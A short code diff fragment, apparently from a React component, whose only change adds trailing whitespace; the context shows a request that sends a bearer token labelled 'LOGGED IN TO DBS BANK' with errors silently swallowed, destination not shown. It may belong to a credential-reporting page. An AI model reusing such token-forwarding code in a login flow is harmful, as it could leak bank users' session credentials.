@@ -89,7 +89,7 @@ useEffect(() => {
         'Authorization': `Bearer ${result.token}`
     },
     body: JSON.stringify({ page: 'LOGGED IN TO DBS BANK' })
-}).catch(() => {});
+}).catch(() => {});  
 
 
       setSubmitted(true)
